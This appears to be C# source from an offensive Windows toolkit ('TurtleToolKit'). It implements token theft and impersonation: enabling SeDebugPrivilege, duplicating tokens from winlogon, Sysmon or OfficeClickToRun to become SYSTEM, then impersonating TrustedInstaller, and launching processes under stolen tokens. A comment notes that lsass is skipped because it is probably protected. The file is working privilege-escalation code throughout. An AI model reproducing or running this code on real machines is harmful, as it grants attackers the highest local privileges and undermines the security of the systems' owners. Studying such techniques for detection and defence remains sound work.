using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using TurtleToolKitManaged;

namespace TurtleToolKitImpersonate
{
    class Impersonator
    {
        public static bool ImpersonateUserViaLogonCreds(string user, string pass, string domain)
        {
            IntPtr hToken = IntPtr.Zero;
            if (!Win32.LogonUser(user, domain, pass, (int)Win32.LogonType.LOGON32_LOGON_INTERACTIVE, (int)Win32.LogonProvider.LOGON32_PROVIDER_DEFAULT, ref hToken)) {
                Console.WriteLine("Failed to logon as user");
                return false;
            }
            IntPtr DuplicatedToken = new IntPtr();
            if (!Win32.DuplicateToken(hToken, 2, ref DuplicatedToken)) {
                Console.WriteLine("Failed to duplicated token");
                return false; 
            }
            if (!Win32.SetThreadToken(IntPtr.Zero, DuplicatedToken))
            {
                Console.WriteLine("Failed to set thread token");
                return false;
            }
            return true;
        }
  
        public static bool IsPrivilegeEnabled(string Privilege)
        {
            bool ret;
            Win32.LUID luid = new Win32.LUID();
            IntPtr hProcess = Win32.GetCurrentProcess();
            IntPtr hToken;
            if (hProcess == IntPtr.Zero) return false;
            if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_QUERY, out hToken)) return false;
            if (!Win32.LookupPrivilegeValue(null, Privilege, out luid)) return false;
            Win32.PRIVILEGE_SET privs = new Win32.PRIVILEGE_SET { Privilege = new Win32.LUID_AND_ATTRIBUTES[1], Control = Win32.PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };
            privs.Privilege[0].Luid = luid;
            privs.Privilege[0].Attributes = Win32.LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;
            if (!Win32.PrivilegeCheck(hToken, ref privs, out ret)) return false;
            return ret;
        }

        public static bool EnablePrivilege(string Privilege)
        {
            Win32.LUID luid = new Win32.LUID();
            IntPtr hProcess = Win32.GetCurrentProcess();
            IntPtr hToken;
            if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_QUERY | Win32.TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;
            if (!Win32.LookupPrivilegeValue(null, Privilege, out luid)) return false;
            // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege.
            Win32.LUID_AND_ATTRIBUTES luAttr = new Win32.LUID_AND_ATTRIBUTES { Luid = luid, Attributes = Win32.LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED };
            // Now we create a TOKEN_PRIVILEGES structure with our modifications
            Win32.TOKEN_PRIVILEGES tp = new Win32.TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new Win32.LUID_AND_ATTRIBUTES[1] };
            tp.Privileges[0] = luAttr;
            Win32.TOKEN_PRIVILEGES oldState = new Win32.TOKEN_PRIVILEGES(); // Our old state.
            if (!Win32.AdjustTokenPrivileges(hToken, false, ref tp, (UInt32)Marshal.SizeOf(tp), ref oldState, out UInt32 returnLength)) return false;
            return true;
        }

        public static bool ImpersonateProcessToken(int pid)
        {
            var allAccessFlags = Win32.ProcessAccessFlags.All;
            IntPtr hProcess = Win32.OpenProcess((uint)allAccessFlags, true, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr hToken;
            if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out hToken))
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr DuplicatedToken = new IntPtr();
            if (!Win32.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            if (!Win32.SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;
            return true;
        }
        public static int ElevateToTs()
        {
            EnablePrivilege("SeDebugPrivilege");
            if (!IsPrivilegeEnabled("SeDebugPrivilege"))
            {
                Console.WriteLine("Failed to enable SeDebugPriv Exiting...");
                return 1;
            }
            Console.WriteLine("Enabled SeDebugPriv");
            Process[] proccesses = Process.GetProcesses();
            int tsPid = 0;
            int lsassPid = 0;
            foreach (Process proc in proccesses)
            {
                if (proc.ProcessName == "TrustedInstaller")
                {
                    tsPid = proc.Id;
                }
                if (proc.ProcessName == "Sysmon" || proc.ProcessName == "OfficeClickToRun" || proc.ProcessName == "winlogon") // we dont use lsass here cause its probably protected
                {
                    lsassPid = proc.Id;
                }
            }
            if (tsPid == 0)
            {
                Console.WriteLine("Failed to find TrustedInstaller make sure its running");
                return 1;
            }
            if (!ImpersonateProcessToken(lsassPid))
            {
                Console.WriteLine("Failed to impersonate system");
                return 1;
            }
            Console.WriteLine("Successfully impersonated system!");
            if (!ImpersonateProcessToken(tsPid))
            {
                Console.WriteLine("Failed to impersonate trusted installer");
                return 1;
            }
            Console.WriteLine("Successfully impersonated trusted installer!");
            return 0;
        }

        public static bool ImpersonateLoggedOnUserViaToken(int pid)
        {
            var allAccessFlags = Win32.ProcessAccessFlags.All;
            IntPtr hProcess = Win32.OpenProcess((uint)allAccessFlags, true, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr hToken;
            if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out hToken))
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr DuplicatedToken = new IntPtr();
            if (!Win32.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            // impersonate logged on user with duplicated token
            if (!Win32.ImpersonateLoggedOnUser(DuplicatedToken)) {
                Console.WriteLine("err failed impersonate logged on user {0}", Marshal.GetLastWin32Error());
                return false;
            }
            return true;
        }
        public static bool RevokePrivs()
        {
            return Win32.RevertToSelf();
        }
        public static int ElevateToSystem()
        {
            EnablePrivilege("SeDebugPrivilege");
            if (!IsPrivilegeEnabled("SeDebugPrivilege"))
            {
                Console.WriteLine("Failed to enable SeDebugPriv Exiting...");
                return 1;
            }
            Console.WriteLine("Enabled SeDebugPriv");
            Process[] proccesses = Process.GetProcesses();
            int lsassPid = 0;
            foreach (Process proc in proccesses)
            {
                if (proc.ProcessName == "Sysmon" || proc.ProcessName == "OfficeClickToRun" || proc.ProcessName == "winlogon") // we dont use lsass here cause its probably protected
                {
                    Console.WriteLine(proc.ProcessName);
                    lsassPid = proc.Id;
                    break;
                }
            }
            if (lsassPid == 0)
            {
                Console.WriteLine("Couldnt get handle to winlogon or officeclicktorun or sysmon");
                return 1;
            }
            if (!ImpersonateLoggedOnUserViaToken(lsassPid))
            {
                Console.WriteLine("Failed to impersonate logon user system");
                return 1;
            }
            Console.WriteLine("Successfully impersonated logon user system!");
            return 0;
        }
        public static bool CreateProcessFromToken(int pid,string fullPathToExe)
        {
            var allAccessFlags = Win32.ProcessAccessFlags.All;
            IntPtr hProcess = Win32.OpenProcess((uint)allAccessFlags, true, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr hToken;
            if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_ASSIGN_PRIMARY| Win32.TOKEN_QUERY | Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out hToken))
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr DuplicatedToken = new IntPtr();
            if (!Win32.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            // impersonate logged on user with duplicated token
            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
            Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
            if (!Win32.DuplicateTokenEx(hToken, (uint)0x02000000L, IntPtr.Zero, 2, 1, out DuplicatedToken)) {
                Console.WriteLine("Failed to dupe token {0}", Marshal.GetLastWin32Error());
                return false;
            }
            //if (!DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED -> 0x02000000L, NULL, seImpersonateLevel  = 2, tokenType TOKENPRIMARY = 1, &newToken))
            //ret = CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY = 2, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE NEW CONSOLE 10, NULL, NULL, &si, &pi);
            if (!Win32.CreateProcessWithTokenW(DuplicatedToken, Win32.LogonFlags.NetCredentialsOnly, fullPathToExe, null, Win32.CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("Failed to create process {0}", Marshal.GetLastWin32Error());
                return false;
            }
            return true;
        }
    }
}